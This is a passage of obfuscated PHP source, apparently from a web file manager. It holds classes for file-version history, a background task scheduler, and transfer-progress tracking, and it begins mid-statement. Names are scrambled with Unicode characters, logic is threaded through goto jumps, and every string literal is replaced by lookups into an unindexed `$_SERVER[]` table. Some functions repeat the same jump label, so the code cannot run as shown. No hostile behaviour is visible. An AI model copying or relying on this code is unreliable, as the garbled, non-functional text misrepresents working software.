$bʝ[3] != REPEAT_REPLACE) { return; } $B = self::parsePath($bʝ[0]); if (!$B) { return; } self::add($B); } public static function eventBeforeEdit($bҼڸ) { $d = self::parsePath($bҼڸ[0]); if (!$d) { return; } self::add($d); } public static function eventBeforeCopyFile($Bጇ, $cƃ͛, $bٟ, $b덪, $B㲟, $f) { $b缫߆ = $bٟ->getPathOuter($b덪); $bľО = self::parsePath($b缫߆); if (!$bľО) { return; } self::add($bľО); } public static function eventBeforeRename($d) { $E =& $_SERVER[]; $B = self::parsePath($d[0]); if (!$B) { return; } $D = self::checkInHistory($B); if (!$D) { return; } if ($D[$E[29]] == $E[193]) { $f = self::listData($B); if ($f && $f[$E[367]]) { self::moveHistory($B, $d[1]); } } else { IO::rename($D[$E[76]], $d[1]); } } public static function eventBeforeMove($Aٌ) { goto bٿҵ; a瑋: $b = self::checkInHistory($f); if (!$b) { return; } $Aߒş = self::pathHistory($Aݒ); goto F즫; F즫: if ($b[$cҦ[29]] == $cҦ[193]) { $F = self::listData($f); $AӒ = rtrim($Aݒ, $cҦ[8]) . $cҦ[8] . ($bܒţ ? $bܒţ : get_path_this($f)); $aޞ = self::listData($AӒ); if ($F && $F[$cҦ[367]] && $aޞ && $aޞ[$cҦ[367]]) { return self::clear($f); } if ($F && $F[$cҦ[367]]) { self::moveHistory($f, $bܒţ, $Aߒş); } } else { IO::move($b[$cҦ[76]], $Aߒş, !1, $bܒţ); self::clearEmptyFolder(IO::pathFather($b[$cҦ[76]])); } goto cƨď; Aᓓ͏: $Aݒ = self::parsePath($Aٌ[1]); if (!$Aݒ) { return; } $bܒţ = $Aٌ[3]; goto a瑋; bٿҵ: $cҦ =& $_SERVER[]; $f = self::parsePath($Aٌ[0]); if (!$f) { return; } goto Aᓓ͏; cƨď: } public static function eventAfterRemove($e吪, $aы) { goto AĂ; AĂ: $a =& $_SERVER[]; if (!$aы) { return; } $cƅ = self::parsePath($e吪[0]); goto Eг; Cы݉: if ($BԒ[$a[29]] == $a[193]) { $Fౣ = self::listData($cƅ, !1); if ($Fౣ && $Fౣ[$a[367]]) { self::clear($cƅ, !1); } } else { IO::remove($BԒ[$a[76]]); self::clearEmptyFolder(IO::pathFather($BԒ[$a[76]])); } goto E্; Eг: if (!$cƅ) { return; } $BԒ = self::checkInHistory($cƅ); if (!$BԒ) { return; } goto Cы݉; E্: } private static function checkInHistory($dݫ) { $Bȹ՛ = self::pathHistory($dݫ); if (!IO::exist($Bȹ՛)) { $Bȹ՛ .= $_SERVER[][1135]; } return IO::exist($Bȹ՛) ? IO::info($Bȹ՛) : !1; } private static function parsePath($BхÃ) { goto fò; fò: $Bɻ­ =& $_SERVER[]; if (!$BхÃ) { return !1; } if ($GLOBALS[$Bɻ­[1136]]) { return; } goto Dƙ厦; Dƙ厦: $CޅΈ = KodIO::parse($BхÃ); $E = $CޅΈ[$Bɻ­[29]]; $d = !$E || $E == KodIO::KOD_IO || $E == KodIO::KOD_SHARE_ITEM; goto c; c: if (!$d || !$CޅΈ[$Bɻ­[1137]]) { return !1; } if (substr($BхÃ, 0, strlen(DATA_PATH . $Bɻ­[1138])) == DATA_PATH . $Bɻ­[1138]) { return !1; } if ($E == KodIO::KOD_SHARE_ITEM) { $D˻ = IO::init($BхÃ); if ($D˻->pathParse[$Bɻ­[1065]]) { return self::parsePath($D˻->pathParse[$Bɻ­[1065]]); } return !1; } goto E; b띛: self::log($GLOBALS[$Bɻ­[1060]] . $Bɻ­[1140] . $BхÃ); return $BхÃ; goto bˍ; E: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $dĻ퐵 = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Bɻ­[1139]); foreach ($dĻ퐵 as $cŷ) { if (!$E && substr($BхÃ, 0, strlen($cŷ)) == $cŷ) { return !1; } } goto b띛; bˍ: } private static function pathHistory($dߥ) { $C =& $_SERVER[]; $cޱ = self::$_historyBase . ltrim(KodIO::clear($dߥ), $C[8]); $cޱ = str_replace(array($C[1141]), array($C[1142]), $cޱ); return $cޱ; } public static function log($b񲺓) { } public static function historyCount($E߲З) { $Cڷ =& $_SERVER[]; $f鋩 = array(); $D = array(); foreach ($E߲З as $Aљ) { $a = get_path_father($Aљ); if (!$D[$a]) { $D[$a] = array(); } $D[$a][] = get_path_this($Aљ); } foreach ($D as $a => $fᵥ) { $B尒 = self::parsePath($a); if (!$B尒) { continue; } foreach ($fᵥ as $E) { $b = self::listData(rtrim($B尒, $Cڷ[8]) . $Cڷ[8] . $E, !1); if ($b && $b[$Cڷ[367]]) { $f鋩[rtrim($a, $Cڷ[8]) . $Cڷ[8] . $E] = count($b[$Cڷ[367]]); } } } return $f鋩; } public static function add($C͋) { goto Fվ; FݿӰ: $aߡ = array($Dކ[395] => $Dڳ, $Dކ[171] => $b׆, $Dކ[28] => $Fٺ[$Dކ[28]] . $Dކ[95] . date($Dކ[1145]) . rand_string(1), $Dކ[78] => $Fٺ[$Dކ[78]], $Dކ[446] => USER_ID, $Dކ[194] => time(), $Dކ[1146] => $Dކ[33]); IO::mkdir($a͜[$Dކ[1147]]); $e֔ă = IO::copy($C͋, $a͜[$Dކ[1147]], !1, $aߡ[$Dކ[28]]); goto eʪĶ; B: if ($Aʛڎ && $Aʛڎ[0][$Dކ[171]] == $b׆) { return !0; } if (array_key_exists($Dކ[196], $Fٺ) && !$Fٺ[$Dކ[196]]) { return !1; } $Dڳ = short_id(time()); goto FݿӰ; F×: if ($B <= 0) { return; } $b׆ = IO::hashSimple($C͋); $Fٺ = IO::info($C͋); goto d̏; eʪĶ: if (!$e֔ă) { self::clearEmptyFolder($a͜[$Dކ[1147]]); return !1; } array_unshift($Aʛڎ, $aߡ); if (count($Aʛڎ) > $Bַн) { $f۟ = array_slice($Aʛڎ, $Bַн); foreach ($f۟ as $fӏي) { IO::remove($a͜[$Dކ[1147]] . $fӏي[$Dކ[28]]); } $Aʛڎ = array_slice($Aʛڎ, 0, $Bַн); } goto Cا; Bጹ: $fۯ = Model($Dކ[747])->get($Dކ[1143]); $B = $GLOBALS[$Dކ[6]][$Dކ[88]][$Dކ[1121]]; $Bַн = $fۯ == $Dކ[1144] ? 5 : $B; goto F×; d̏: $Aʛڎ = $a͜[$Dކ[367]]; if ($Fٺ[$Dކ[78]] == 0) { return; } if ($Fٺ[$Dކ[78]] >= 1024 * 1024 * 500) { return !1; } goto B; Fվ: $Dކ =& $_SERVER[]; $a͜ = self::listData($C͋); if (!$a͜) { return; } goto Bጹ; Cا: return self::saveData($a͜[$Dކ[1148]], $Aʛڎ); goto Aº; Aº: } public static function remove($fʎ, $D) { $aڂ =& $_SERVER[]; $eԛ؎ = self::listData($fʎ); $Eݹ = array(); if (!$eԛ؎) { return !1; } foreach ($eԛ؎[$aڂ[367]] as $d) { if ($d[$aڂ[395]] == $D) { IO::remove($eԛ؎[$aڂ[1147]] . $d[$aڂ[28]]); continue; } $Eݹ[] = $d; } return self::saveData($eԛ؎[$aڂ[1148]], $Eݹ); } public static function clear($cΜ˝, $F = true) { $d =& $_SERVER[]; $e = self::listData($cΜ˝, $F); if (!$e) { return !1; } foreach ($e[$d[367]] as $A٣ٜ) { IO::remove($e[$d[1147]] . $A٣ٜ[$d[28]]); } return self::saveData($e[$d[1148]], array()); } public static function moveHistory($E, $d = '', $Aդ = '') { goto A蘟; AÕ: $a㭅 = substr(get_path_this($D[$A[1148]]), 0, -strlen($Cѻ)); foreach ($D[$A[367]] as $e؇ => $E޴) { $Cΐ = $d . substr($E޴[$A[28]], strlen($a㭅)); $E = IO::move($D[$A[1147]] . $E޴[$A[28]], $Aդ, !1, $Cΐ); if ($E) { $D[$A[367]][$e؇][$A[28]] = $Cΐ; } } $D[$A[1148]] = IO::move($D[$A[1148]], $Aդ, !1, $d . $Cѻ); goto e֊; A蘟: $A =& $_SERVER[]; $D = self::listData($E, !1); if (!$D || !$D[$A[367]]) { return !1; } goto bﻝ; bﻝ: $Cѻ = $A[1135]; $d = $d ? $d : get_path_this($E); $Aդ = $Aդ ? $Aդ : $D[$A[1147]]; goto AÕ; e֊: self::saveData($D[$A[1148]], $D[$A[367]]); self::clearEmptyFolder($D[$A[1147]]); goto cܶ͗; cܶ͗: } public static function rollback($aӛ, $A) { $f =& $_SERVER[]; $bְ = self::listData($aӛ); if (!$bְ) { return; } $Aۈ = IO::info($aӛ); foreach ($bְ[$f[367]] as $D => $b) { if ($b[$f[395]] == $A) { self::add($aӛ); $č = $bְ[$f[1147]] . $b[$f[28]]; $d֏ = IO::copy($č, IO::pathFather($aӛ), REPEAT_REPLACE, $Aۈ[$f[28]]); if ($d֏) { self::remove($aӛ, $A); } return $d֏; } } return !1; } public static function setDetail($D܈, $cҖ, $aՊ꟬) { $E⎭ =& $_SERVER[]; $E֡ؓ = self::listData($D܈); if (!$E֡ؓ) { return; } foreach ($E֡ؓ[$E⎭[367]] as $D => $E) { if ($E[$E⎭[395]] == $cҖ) { $E֡ؓ[$E⎭[367]][$D][$E⎭[1146]] = $aՊ꟬; self::saveData($E֡ؓ[$E⎭[1148]], $E֡ؓ[$E⎭[367]]); return !0; } } return !1; } public static function fileInfo($e钋, $AᏏӄ) { goto f졇҆; a: $A = $c[33]; foreach ($e[$c[367]] as $F뛟 => $e̊) { if ($e̊[$c[395]] != $AᏏӄ) { continue; } $A = $e[$c[1147]] . $e̊[$c[28]]; break; } if (!$A) { show_json(LNG($c[105]), !1); } goto a; f졇҆: $c =& $_SERVER[]; $e = self::listData($e钋); if (!$e) { show_json(LNG($c[105]), !1); } goto a; a: return IO::info($A); goto aݞϵ; aݞϵ: } public static function fileOut($Bݥ, $dѴ, $Dΰ = false) { $c =& $_SERVER[]; $C߰ = self::fileInfo($Bݥ, $dѴ); $e =& $GLOBALS[$c[7]]; $Dΰ = isset($e[$c[1111]]) && $e[$c[1111]] == 1; if (isset($e[$c[29]]) && $e[$c[29]] == $c[1149]) { return IO::fileOutImage($C߰[$c[76]], $e[$c[1150]]); } IO::fileOut($C߰[$c[76]], $Dΰ, get_path_this($Bݥ)); } public static function listData($C, $b = true) { goto D˂; b: if (substr($C, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $AӏȌ = self::pathHistory($C); $c = array($eՊ[1148] => $AӏȌ . $eՊ[1135], $eՊ[1147] => rtrim(get_path_father($AӏȌ), $eՊ[8]) . $eՊ[8], $eՊ[367] => array()); goto Dڒվ; Dڒվ: $cˋ = IO::getContent($c[$eՊ[1148]]); if ($cˋ) { $bϡ = json_decode($cˋ, !0); if (is_array($bϡ)) { $c[$eՊ[367]] = $bϡ; } } return $c; goto e・; D˂: $eՊ =& $_SERVER[]; if ($b && !IO::exist($C)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto b; e・: } private static function saveData($DᲑ, $F) { goto F; F: $b =& $_SERVER[]; self::log($b[1151] . $DᲑ . $b[68] . count($F), $b[729]); if ($F) { return IO::setContent($DᲑ, json_encode($F)); } goto F; F: $C彻 = IO::pathFather($DᲑ); IO::remove($DᲑ); self::clearEmptyFolder($C彻); goto f¨; f¨: return !0; goto dƲ; dƲ: } public static function clearEmptyFolder($b) { goto e; e: $cǏ =& $_SERVER[]; if (trim($b, $cǏ[8]) == trim(self::$_historyBase, $cǏ[8])) { return; } $FÃц = IO::pathFather($b); goto C߿; dݝ: self::clearEmptyFolder($FÃц); goto FƊ; C߿: $eՓ = IO::has($b, !0); if ($eՓ[$cǏ[203]] > 0 || $eՓ[$cǏ[204]] > 0) { return; } IO::remove($b); goto dݝ; FƊ: } private static function getBasePath() { goto C; C: $FڻŔ =& $_SERVER[]; $Bȼ = Model($FڻŔ[1152])->get($FڻŔ[1153]); if ($Bȼ) { if (!IO::exist($Bȼ)) { IO::mkdir($Bȼ); } if (get_path_this($Bȼ) == $FڻŔ[1138]) { $e笎 = $FڻŔ[1154] . rand_string(8); @rename($Bȼ, get_path_father($Bȼ) . $FڻŔ[8] . $e笎); $Bȼ = DATA_PATH . $e笎 . $FڻŔ[8]; file_put_contents(DATA_PATH . $FڻŔ[1155], $FڻŔ[33]); Model($FڻŔ[1152])->set($FڻŔ[1153], $Bȼ); } return $Bȼ; } goto bԿ; bԿ: $Bȼ = DATA_PATH . $FڻŔ[1154] . rand_string(8) . $FڻŔ[8]; $Bȼ = IO::mkdir($Bȼ); $Bȼ = rtrim($Bȼ, $FڻŔ[8]) . $FڻŔ[8]; goto A; A: file_put_contents($Bȼ . $FڻŔ[1155], $FڻŔ[33]); file_put_contents(DATA_PATH . $FڻŔ[1155], $FڻŔ[33]); Model($FڻŔ[1152])->set($FڻŔ[1153], $Bȼ); goto Fΐ; Fΐ: return $Bȼ; goto d։; d։: } } goto f; D⧗: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto cƋ; cƋ: $bŚˮ =& $_SERVER[]; if (self::valueGet($bŚˮ[727]) != $bŚˮ[87]) { return; } if (self::valueGet($bŚˮ[1509]) == $bŚˮ[87]) { $F֬ϵ = self::valueGet($bŚˮ[1510]); if (time() - $F֬ϵ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto Dܖ䋡; Dܖ䋡: http_close(); self::valueSet($bŚˮ[1509], $bŚˮ[87]); Hook::bind($bŚˮ[1511], $bŚˮ[1512]); goto E; E: while (!0) { self::cacheClear(); if (self::valueGet($bŚˮ[727]) != $bŚˮ[87]) { self::valueSet($bŚˮ[1509], $bŚˮ[191]); self::log($bŚˮ[1513]); die; } self::valueSet($bŚˮ[1509], $bŚˮ[87]); self::valueSet($bŚˮ[1510], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto f笹; f笹: } public static function restart() { $b =& $_SERVER[]; http_close(); self::valueSet($b[727], $b[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($b[1509], $b[191]); self::valueSet($b[727], $b[87]); } public static function shutdownEvent() { $e =& $_SERVER[]; self::valueSet($e[1509], $e[191]); self::log($e[1514]); } public static function config($E, $Dθ) { self::valueSet($_SERVER[][727], $E); } private static function taskRunAll() { goto f˴; A˭Ӈ: self::taskQueueRun($e); goto a; e: $Cϴ = count($Aӎɮ); for ($bӳ = 0; $bӳ < $Cϴ; $bӳ++) { $F̦˿ = $Aӎɮ[$bӳ]; if (!$F̦˿[$d犑[395]] || $F̦˿[$d犑[1516]] != $d犑[87]) { continue; } if (!self::taskTimeCheck($F̦˿)) { continue; } self::taskRun($F̦˿); } Hook::trigger($d犑[1517]); goto A˭Ӈ; f˴: $d犑 =& $_SERVER[]; $e = timeFloat(); $Aӎɮ = Model($d犑[1515])->listData(); goto e; a: } private static function taskQueueRun($C丱) { $B = 10; while (!0) { $b¨ = TaskQueue::run(); if ($b¨ === !1) { break; } if (timeFloat() - $C丱 >= $B) { break; } } } private static function taskTimeCheck($Bَ) { goto EǠ; E: $EЉ߯ = strtotime($a[1518] . $c[$a[1519]] . $a[1520]) - strtotime($a[1521]); $FȦ̧ = time() - strtotime(date($a[1522]) . $a[1523]); $BÉ = $FȦ̧ >= $EЉ߯ && $FȦ̧ <= $EЉ߯ + 3600; goto dܢ܍; dܢ܍: switch ($c[$a[29]]) { case $a[1524]: if (time() - $cۦ < 3600 * 24 * 30) { return !1; } if ($c[$a[1524]] == date($a[1525]) && $BÉ) { return !0; } break; case $a[1526]: if (time() - $cۦ < 3600 * 24 * 7) { return !1; } $B͎ⷑ = date($a[1527]) == 0 ? 7 : date($a[1527]); if ($c[$a[1526]] == $B͎ⷑ && $BÉ) { return !0; } break; case $a[1519]: if (time() - $cۦ < 3600 * 24) { return !1; } if ($BÉ) { return !0; } break; case $a[1528]: if (time() - $cۦ >= floatval($c[$a[1528]]) * 60) { return !0; } break; default: break; } return !1; goto bΗٰ; EǠ: $a =& $_SERVER[]; $c = json_decode($Bَ[$a[197]], !0); $cۦ = intval($Bَ[$a[1510]]); goto E; bΗٰ: } private static function closeDatabase() { goto C梣; A皍: if (!$F) { $F = time(); } if (time() - $F < $Cк) { return; } $F = time(); goto BѰ; BѰ: $fŽǍ = Model($aԷ[507])->db($aԷ[33]); if ($fŽǍ) { $fŽǍ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($aԷ[1529], $aԷ[1530]); die; } goto a; C梣: $aԷ =& $_SERVER[]; static $F = 0; $Cк = 300; goto A皍; a: } public static function taskRun($F爇) { goto Ȅ; Ȅ: $Eț =& $_SERVER[]; self::log($Eț[1531] . $F爇[$Eț[395]] . $Eț[1532] . $F爇[$Eț[28]] . $Eț[1533] . $F爇[$Eț[1534]]); Model($Eț[1515])->run($F爇[$Eț[395]]); goto d; B: return !0; goto b; d: $eر = timeFloat(); $Dʤ = $Eț[33]; switch ($F爇[$Eț[29]]) { case $Eț[305]: $C = url_request($F爇[$Eț[1534]], $Eț[228], !1, !1, !1, !1, 10); if ($C[$Eț[727]]) { $Dʤ = strlen($C[$Eț[1105]]); } break; case $Eț[227]: $Dʤ = Hook::apply($F爇[$Eț[1534]]); default: break; } goto d; d: Model($Eț[1535])->add(array($Eț[1536] => $Eț[33], $Eț[1537] => $Eț[191], $Eț[29] => $Eț[1538] . $F爇[$Eț[395]], $Eț[1539] => json_encode(array($Eț[28] => $F爇[$Eț[28]], $Eț[1540] => timeFloat() - $eر, $Eț[291] => $Dʤ)))); $F՛ = $Dʤ ? $Eț[1541] . $Dʤ : $Eț[33]; self::log($Eț[1542] . $F爇[$Eț[395]] . $Eț[530] . $F՛); goto B; b: } private static function valueGet($aÌ) { $A =& $_SERVER[]; $aҒ = $A[1543]; $c⛈ = Model($A[427])->get($aÌ, $aҒ); if (is_null($c⛈)) { Model($A[427])->set($A[727], $A[87], $aҒ); Model($A[427])->set($A[1509], $A[191], $aҒ); $c⛈ = Model($A[427])->get($aÌ, $aҒ); } return $c⛈; } private static function valueSet($A̳ݘ, $a) { $AƠ =& $_SERVER[]; $EÍ = $AƠ[1544]; CacheLock::lock($EÍ); $FÈ = Model($AƠ[427])->set($A̳ݘ, $a, $AƠ[1543]); CacheLock::unlock($EÍ); return $FÈ; } protected static function log($F蔡㡏) { write_log($F蔡㡏, $_SERVER[][1530]); } private static function cacheClear() { $BЭ =& $_SERVER[]; Cache::clearMemory(Model($BЭ[427])->cacheKey($BЭ[1543])); Cache::clearMemory(Model($BЭ[427])->cacheKey($BЭ[1545])); Model($BЭ[1515])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\151\x6e\147"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($C񪒻, $E롶元 = '', $B㫼 = 0, $fӳ = '') { goto eƾ; b: $this->startAfter(); Hook::trigger($fќ[1556], $this->task); $this->task[$fќ[1549]] = timeFloat(); goto fʅ; eƾ: $fќ =& $_SERVER[]; if (self::get($C񪒻)) { return; } $this->task = array($fќ[395] => $C񪒻, $fќ[1546] => USER_ID, $fќ[1449] => $fӳ, $fќ[29] => $E롶元, $fќ[1041] => $fќ[33], $fќ[1039] => $B㫼, $fќ[1053] => 0, $fќ[1547] => 0, $fќ[1548] => 0, $fќ[766] => timeFloat(), $fќ[765] => 0, $fќ[1549] => 0, $fќ[1550] => 0, $fќ[1551] => 0, $fќ[727] => $fќ[1509]); goto dǜ; dǜ: $GLOBALS[$fќ[1552]] = 1; Hook::bind($fќ[1511], array($this, $fќ[1553])); Hook::bind($fќ[1554], array($this, $fќ[1555])); goto b; fʅ: } public function end() { goto C趱; Eѿѱ: $C = timeFloat() - $this->task[$FÄ[766]]; self::log($FÄ[1557] . $this->task[$FÄ[395]] . $FÄ[1558] . $C . $FÄ[1559]); Hook::unbind($FÄ[1511], array($this, $FÄ[1553])); goto E܅; E܅: Hook::unbind($FÄ[1554], array($this, $FÄ[1555])); $this->endAfter(); $this->task = !1; goto F،; C趱: $FÄ =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$FÄ[1549]]) { self::valueSet($this->task[$FÄ[395]], !1); } goto Eѿѱ; F،: } public function update($aٷ = 0, $c͗ = false) { goto F; CɦЏ: Hook::trigger($aȚׯ[1563], $D썃); self::valueSet($D썃[$aȚׯ[395]], $D썃); goto bٍ; c: $D썃[$aȚׯ[727]] = $A٘ ? $A٘ : $D썃[$aȚׯ[727]]; $D썃[$aȚׯ[1550]] = $C׻[$aȚׯ[1550]] ? $C׻[$aȚׯ[1550]] : 0; $D썃[$aȚׯ[1549]] = timeFloat(); goto CɦЏ; D: $D썃[$aȚׯ[1053]] += $aٷ; $D썃[$aȚׯ[765]] = timeFloat(); if ($D썃[$aȚׯ[1039]]) { if ($D썃[$aȚׯ[1039]] < $D썃[$aȚׯ[1053]]) { $D썃[$aȚׯ[1039]] = $D썃[$aȚׯ[1053]]; } $cО = timeFloat() - $D썃[$aȚׯ[766]] - $D썃[$aȚׯ[1550]]; $D썃[$aȚׯ[1547]] = $D썃[$aȚׯ[1053]] / $D썃[$aȚׯ[1039]]; $D썃[$aȚׯ[1548]] = $D썃[$aȚׯ[1053]] / $cО; if ($D썃[$aȚׯ[1547]] > 0) { $D썃[$aȚׯ[1551]] = $cО * (1 - $D썃[$aȚׯ[1547]]) / $D썃[$aȚׯ[1547]]; } $D썃[$aȚׯ[1551]] = $D썃[$aȚׯ[1551]] <= 0 ? 0 : $D썃[$aȚׯ[1551]]; } goto FǍն; FǍն: $this->updateAfter(); $a̎ר = 0.2; if (timeFloat() - $D썃[$aȚׯ[1549]] < $a̎ר && !$c͗) { return; } goto Eˆ; Eˆ: $C׻ = self::get($D썃[$aȚׯ[395]]); $A٘ = $C׻[$aȚׯ[727]]; if ($A٘ == self::STATYS_KILL) { $f՚ = array($aȚׯ[1560] => LNG($aȚׯ[1561]), $aȚׯ[1103] => !1); Cache::set($aȚׯ[1562] . $this->task[$aȚׯ[395]], $f՚, 30); $this->onKill(); $this->end(); die; } else { if ($A٘ == self::STATYS_STOP) { $fʿ  = 2; $C׻[$aȚׯ[1550]] += $fʿ ; self::valueSet($D썃[$aȚׯ[395]], $C׻); sleep($fʿ ); $this->update(); return; } } goto c; F: $aȚׯ =& $_SERVER[]; $D썃 =& $this->task; if (!$D썃) { return; } goto D; bٍ: } public function onKillSet($eॴ, $Aۣ = array()) { $this->onKillCall = array($eॴ, $Aۣ); } public function onKill() { $bȦ =& $_SERVER[]; self::log($bȦ[1557] . $this->task[$bȦ[395]] . $bȦ[1564]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Bд) { $E =& $_SERVER[]; Cache::set($E[1562] . $this->task[$E[395]], $Bд, 60); return $Bд; } public static function get($eÔ) { $eթج =& $_SERVER[]; $e = self::valueGet($eÔ); if (is_array($e) && $e[$eթج[1565]]) { $AԆ指 = ActionApply($e[$eթج[1565]], array($e)); $e = is_array($AԆ指) ? $AԆ指 : $e; } return $e; } public static function listData() { $e߾ل = self::valueGet(); return array_sort_by($e߾ل, $_SERVER[][766], !0); } public static function kill($E𗷏) { return self::changeStatus($E𗷏, self::STATYS_KILL); } public static function stop($aƈ) { return self::changeStatus($aƈ, self::STATYS_STOP); } public static function restart($FТ׃) { return self::changeStatus($FТ׃, self::STATYS_RUNNING); } public static function killAll() { $fȪ =& $_SERVER[]; $d覴 = self::listData(); foreach ($d覴 as $Bմ) { self::kill($Bմ[$fȪ[395]]); } sleep(2); foreach ($d覴 as $Bմ) { self::valueSet($Bմ[$fȪ[395]], !1); } } private static function changeStatus($bב, $F) { goto c̓; c̓: $Fж =& $_SERVER[]; $F = self::valueGet($bב); if (!$F) { return !1; } goto c߂; aƟ: return !0; goto d; c߂: $F[$Fж[727]] = $F; self::valueSet($bב, $F); self::log($Fж[1566] . $F[$Fж[395]] . $Fж[1567] . $F); goto aƟ; d: } public static function valueGet($b͍ = false) { $fϊߎ =& $_SERVER[]; if ($b͍) { $Eζ = Model($fϊߎ[439])->where(array($fϊߎ[93] => $b͍, $fϊߎ[29] => $fϊߎ[1568]))->find(); return $Eζ ? json_decode($Eζ[$fϊߎ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Bܘœ = false) { goto eҔ; e۲: $D̃ = Model($fˉ[439])->where($Cԍɒ)->select(); $D̃ = $D̃ ? $D̃ : array(); foreach ($D̃ as $C => $dק懺) { $D̃[$C] = json_decode($dק懺[$fˉ[372]], !0); } goto fІ; eҔ: $fˉ =& $_SERVER[]; $Cԍɒ = array($fˉ[29] => $fˉ[1568]); if ($Bܘœ) { $Cԍɒ[$fˉ[1546]] = $Bܘœ; } goto e۲; fІ: return $D̃; goto b; b: } public static function valueSet($C, $eäǆ) { goto F; F: $c󷽫 =& $_SERVER[]; if (!$eäǆ) { return Model($c󷽫[439])->where(array($c󷽫[93] => $C, $c󷽫[29] => $c󷽫[1568]))->delete(); } $bق = json_encode($eäǆ); goto bɡԲ; bɡԲ: if (!$bق) { ob_start(); var_dump($eäǆ); $D = ob_get_clean(); self::log($c󷽫[1569] . json_encode_force($D)); } if (!$C || !$eäǆ[$c󷽫[395]]) { return !1; } $d㞽 = array($c󷽫[29] => $c󷽫[1568], $c󷽫[1546] => USER_ID, $c󷽫[93] => $C, $c󷽫[372] => $bق); goto C㲕; eÃ: CacheLock::unlock($aֲ슛); goto eƚ埱; C㲕: $aֲ슛 = $c󷽫[1570]; CacheLock::lock($aֲ슛); Model($c󷽫[439])->add($d㞽, array(), !0); goto eÃ; eƚ埱: } public static function log($a) { if (!GLOBAL_DEBUG) { return; } write_log($a, $_SERVER[][1571]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto bņʅ; Eư: $Aҽ[$FԚ[1596]] = 0; $Aҽ[$FԚ[1597]] = 0; if (!$Aҽ[$FԚ[1449]]) { $Aҽ[$FԚ[1449]] = LNG($FԚ[1598]); } goto b٩ו; Eʸľ: Hook::bind($FԚ[596], array($this, $FԚ[1579])); Hook::bind($FԚ[562], array($this, $FԚ[1580])); Hook::bind($FԚ[559], array($this, $FԚ[1580])); goto dȰ; Aʕ: Hook::bind($FԚ[1572], array($this, $FԚ[1573])); Hook::bind($FԚ[1127], array($this, $FԚ[1574])); Hook::bind($FԚ[1575], array($this, $FԚ[1576])); goto c; bņʅ: $FԚ =& $_SERVER[]; $Aҽ =& $this->task; $this->sourceCopyFolder = !1; goto Aʕ; Eٓ: $Aҽ[$FԚ[1041]] = $FԚ[33]; $Aҽ[$FԚ[1594]] = $FԚ[33]; $Aҽ[$FԚ[1595]] = 0; goto Eư; dߔ: $Aҽ[$FԚ[1590]] = LNG($FԚ[1591]); $Aҽ[$FԚ[1592]] = 0; $Aҽ[$FԚ[1593]] = 0; goto Eٓ; c: Hook::bind($FԚ[592], array($this, $FԚ[1577])); Hook::bind($FԚ[593], array($this, $FԚ[1578])); Hook::bind($FԚ[595], array($this, $FԚ[1579])); goto Eʸľ; dȰ: Hook::bind($FԚ[564], array($this, $FԚ[1580])); Hook::bind($FԚ[566], array($this, $FԚ[1580])); Hook::bind($FԚ[568], array($this, $FԚ[1580])); goto bԺ; FĞ: Hook::bind($FԚ[1584], array($this, $FԚ[1585])); Hook::bind($FԚ[1586], array($this, $FԚ[1587])); Hook::bind($FԚ[1588], array($this, $FԚ[1589])); goto dߔ; bԺ: Hook::bind($FԚ[1581], array($this, $FԚ[1582])); Hook::bind($FԚ[585], array($this, $FԚ[1583])); $this->sourceModelCopyFlag = !1; goto FĞ; b٩ו: } protected function endAfter() { goto D; Ä: Hook::unbind($Aˢ똊[568], array($this, $Aˢ똊[1580])); Hook::unbind($Aˢ똊[1581], array($this, $Aˢ똊[1582])); Hook::unbind($Aˢ똊[585], array($this, $Aˢ똊[1583])); goto B; Fۈ: Hook::unbind($Aˢ똊[595], array($this, $Aˢ똊[1579])); Hook::unbind($Aˢ똊[596], array($this, $Aˢ똊[1579])); Hook::unbind($Aˢ똊[562], array($this, $Aˢ똊[1580])); goto DȈ; DȈ: Hook::unbind($Aˢ똊[559], array($this, $Aˢ똊[1580])); Hook::unbind($Aˢ똊[564], array($this, $Aˢ똊[1580])); Hook::unbind($Aˢ똊[566], array($this, $Aˢ똊[1580])); goto Ä; A翐: Hook::unbind($Aˢ똊[1575], array($this, $Aˢ똊[1576])); Hook::unbind($Aˢ똊[592], array($this, $Aˢ똊[1577])); Hook::unbind($Aˢ똊[593], array($this, $Aˢ똊[1578])); goto Fۈ; B: Hook::unbind($Aˢ똊[1584], array($this, $Aˢ똊[1585])); Hook::unbind($Aˢ똊[1586], array($this, $Aˢ똊[1587])); Hook::unbind($Aˢ똊[1588], array($this, $Aˢ똊[1589])); goto Bˍ; D: $Aˢ똊 =& $_SERVER[]; Hook::unbind($Aˢ똊[1572], array($this, $Aˢ똊[1573])); Hook::unbind($Aˢ똊[1127], array($this, $Aˢ똊[1574])); goto A翐; Bˍ: } public function copyMoveStart($cУ, $CͶ, $C, $eĊ) { goto e͇Շ; fᠩ: $a[$b[1600]] = KodIO::transferType($cУ, $C); $this->update(); goto Aٺ; e͇Շ: $b =& $_SERVER[]; self::log($b[1599] . $CͶ . $b[67] . $eĊ); $dΔ = rtrim(TEMP_FILES, $b[8]); goto A; A: if (substr($CͶ, 0, strlen($dΔ)) == $dΔ) { return; } if (substr($eĊ, 0, strlen($dΔ)) == $dΔ) { return; } $a =& $this->task; goto fᠩ; Aٺ: } public function updateAfter() { $aÉ =& $_SERVER[]; $C =& $this->task; if (!$C[$aÉ[740]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($C[$aÉ[1600]] == $aÉ[1200]) { return; } self::updateTask($C); } private 